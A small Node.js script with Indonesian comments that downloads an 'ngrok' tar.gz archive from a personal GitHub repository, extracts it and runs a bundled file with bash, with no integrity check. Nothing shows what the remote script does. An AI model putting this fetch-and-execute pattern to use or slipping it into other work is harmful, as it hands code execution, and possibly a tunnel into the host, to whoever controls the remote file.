const https = require("https");
const fs = require("fs");
const { exec } = require("child_process");
const tar = require("tar");
const path = require("path");

// URL file tar.gz
const url = "https://raw.githubusercontent.com/rinadila/panuan/refs/heads/main/ngrok.tar.gz";
const output = path.join(__dirname, "ngrok.tar.gz");
const extractDir = path.join(__dirname, "extracted");

// Fungsi untuk download file
function downloadFile(url, dest, callback) {
  const file = fs.createWriteStream(dest);
  https.get(url, (response) => {
    if (response.statusCode !== 200) {
      return callback(new Error(`Download gagal. Status: ${response.statusCode}`));
    }
    response.pipe(file);
    file.on("finish", () => {
      file.close(callback);
    });
  }).on("error", (err) => {
    fs.unlink(dest, () => {}); // hapus file bila error
    callback(err);
  });
}

// Fungsi utama
downloadFile(url, output, (err) => {
  if (err) return console.error("Error download:", err);

  console.log("Download selesai. Mengekstrak...");

  // Ekstrak file tar.gz
  tar.x({
    file: output,
    cwd: extractDir, // ekstrak ke folder tujuan
    sync: true
  });

  console.log("Ekstraksi selesai.");

  // Jalankan file app.sh
  const scriptPath = path.join(extractDir, "urlngrok");
  exec(`bash ${scriptPath}`, (error, stdout, stderr) => {
    if (error) {
      console.error(`Error eksekusi: ${error.message}`);
      return;
    }
    if (stderr) {
      console.error(`stderr: ${stderr}`);
    }
    console.log(`stdout: ${stdout}`);
  });
});
